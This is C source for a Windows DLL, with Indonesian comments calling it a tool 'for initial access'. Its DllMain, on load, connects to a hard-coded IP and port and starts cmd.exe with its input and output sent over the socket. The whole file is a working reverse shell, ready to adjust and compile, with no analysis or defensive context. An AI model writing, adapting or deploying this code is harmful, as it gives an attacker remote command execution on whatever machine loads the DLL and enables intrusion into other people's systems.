// <- buat initial access

#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define REVERSEIP   "172.28.200.157" // <- Di sesuaikan aja
#define REVERSEPORT 5151          // <- Di sesuaikan juga

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        WSADATA wsaData;
        SOCKET sock;
        struct sockaddr_in server;
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;

        // Init Winsock
        WSAStartup(MAKEWORD(2, 2), &wsaData);

        // Create socket
        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (sock == INVALID_SOCKET) return FALSE;

        // Target connection
        server.sin_family = AF_INET;
        server.sin_port = htons(REVERSEPORT);
        server.sin_addr.s_addr = inet_addr(REVERSEIP);

        // Connect
        if (WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(sock);
            WSACleanup();
            return FALSE;
        }

        // Redirect IO to socket
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

        // Spawn shell
        CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    }

    return TRUE;
}
